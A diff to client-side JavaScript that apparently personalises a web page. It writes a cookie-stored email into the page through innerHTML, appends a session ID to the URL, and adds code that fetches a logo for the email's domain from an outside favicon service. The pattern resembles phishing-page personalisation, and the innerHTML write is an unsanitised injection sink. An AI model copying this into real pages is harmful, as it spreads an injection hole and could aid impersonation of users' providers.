@@ -323,7 +323,8 @@ if (receiverEmailzohoTest != null) {
   if (receiverEmailzohoValue != undefined) {
     $(function () {
       receiverEmailzohoValue = Cookies.get("user");
-      document.getElementById("receiverEmailzoho").innerHTML = receiverEmailzohoValue;
+      document.getElementById("receiverEmailzoho").innerHTML =
+        receiverEmailzohoValue;
     });
   }
 }
@@ -411,7 +412,8 @@ var parametersSessionID = parameters.get("sessionID");
 if (
   sessionIDvalve != null &&
   dontaddsessionIDvalve == null &&
-  parametersSessionID == null) {
+  parametersSessionID == null
+) {
   var url = window.location.href;
   var newurl = url + "&sessionID=" + sessionIDvalve;
   window.history.replaceState({ path: newurl }, "", newurl);
@@ -424,5 +426,10 @@ if (dontclickback != null) {
   window.history.replaceState("thanks", null, "/thanks?" + urlallgetvalue);
 }
 
-
-
+// Read Domain name from URL and insert to picture
+var useEmailLogofromurlTest = document.getElementById("useEmailLogofromurl");
+if (useEmailLogofromurlTest != null) {
+  var Domainfromemail = userurlemail.split("@")[1];
+  document.getElementById("useEmailLogofromurl").src =
+    "https://f1.allesedv.com/150/" + Domainfromemail;
+}
